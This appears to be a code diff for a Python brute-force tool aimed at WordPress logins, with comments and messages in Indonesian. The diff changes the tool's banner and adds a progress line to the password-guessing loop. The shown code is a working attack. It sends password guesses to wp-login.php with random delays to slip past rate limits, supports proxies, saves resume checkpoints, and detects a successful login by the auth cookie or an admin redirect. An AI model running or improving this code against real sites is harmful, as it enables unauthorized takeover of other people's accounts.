@@ -30,17 +30,14 @@ RESET  = "\033[0m"
 # ──────────────────────────────────────────────────────────────────────────────
 ASCII_ART = f"""
 {GREEN}
-██╗    ██╗██████╗ ██████╗ ██████╗ ██╗   ██╗███████╗
-██║    ██║██╔══██╗██╔══██╗██╔══██╗██║   ██║╚════██║
-██║ █╗ ██║██████╔╝██████╔╝██████╔╝██║   ██║   ██╔═╝
-██║███╗██║██╔═══╝ ██╔══██╗██╔══██╗██║   ██║  ██╔═╝ 
-╚███╔███╔╝██║     ██║  ██║██████╔╝╚██████╔╝███████╗
- ╚══╝╚══╝ ╚═╝     ╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚══════╝
-
-{YELLOW}╦ ╦┌─┐┬─┐┬┌─┌─┐┬─┐  {CYAN}╔═╗┌─┐┬─┐┬  ┬┌─┐┬─┐
-{YELLOW}╠═╣├─┤├┬┘├┴┐├┤ ├┬┘  {CYAN}║ ╦│ │├┬┘└┐┌┘├┤ ├┬┘
-{YELLOW}╩ ╩┴ ┴┴└─┴ ┴└─┘┴└─  {CYAN}╚═╝└─┘┴└─ └┘ └─┘┴└─
+ __        ____  ____  ____  ____  _   _ 
+ \\ \\      / / _ \\| __ )/ ___|| | | |
+  \\ \\ /\\ / / | | |  _ \\___ \\| |_| |
+   \\ V  V /| |_| | |_) |__) |  _  |
+    \\_/\\_/  \\___/|____/____/|_| |_|
 {RESET}
+
+{CYAN}WHITE HACKER{RESET}
 """
 
 # ──────────────────────────────────────────────────────────────────────────────
@@ -151,19 +148,24 @@ def bruteforce_wp(
     resume_file: Optional[Path],
     proxy: Optional[str]
 ) -> Optional[str]:
-    """Brute-force WordPress login sequentially, with resume checkpoint."""
+    """Brute-force WordPress login sequentially, with resume checkpoint & progress."""
     login_url = f"{target_url.rstrip('/')}/wp-login.php"
     session = requests.Session()
     proxies = {"http": proxy, "https": proxy} if proxy else None
 
+    total = len(passwords)
     # Resume support
     start_idx = 0
     if resume_file and resume_file.exists():
         start_idx = int(resume_file.read_text().strip() or "0")
         logging.info("Melanjutkan dari password ke-%d", start_idx)
 
-    for idx in range(start_idx, len(passwords)):
+    for idx in range(start_idx, total):
         pwd = passwords[idx]
+        # tampilkan progress di satu baris
+        print(f"\r{YELLOW}[{idx+1}/{total}]{RESET} Mencoba password: {pwd}", end="", flush=True)
+
+        # jeda acak
         time.sleep(random.uniform(delay_range[0], delay_range[1]))
 
         data = {
@@ -185,27 +187,25 @@ def bruteforce_wp(
                 proxies=proxies,
             )
         except requests.RequestException as e:
-            logging.warning("Request gagal (%s): %s", pwd, e)
+            logging.warning(" Request gagal: %s", e)
             continue
 
-        # Debug detail
-        if logging.getLogger().level == logging.DEBUG:
-            logging.debug("Tried %-20s → %3d %s", pwd, resp.status_code, resp.url)
-
-        # Cek cookie & redirect
+        # Cek berhasil login
         cookies = session.cookies.get_dict()
         if "wordpress_logged_in" in cookies or "/wp-admin/" in resp.url:
+            # pindah ke baris baru untuk pesan sukses
+            print()
             logging.info(f"{GREEN}🎉 Password ditemukan: {username} / {pwd}{RESET}")
             if resume_file and resume_file.exists():
                 resume_file.unlink()
             return pwd
 
-        # tulis checkpoint
+        # simpan checkpoint
         if resume_file:
             resume_file.write_text(str(idx + 1))
 
-        logging.debug("[-] Gagal: %s", pwd)
-
+    # jika tidak ada yang cocok
+    print()  # pastikan kursor pindah baris
     logging.error("%s Tidak ada password cocok untuk %s.%s", RED, username, RESET)
     return None
 
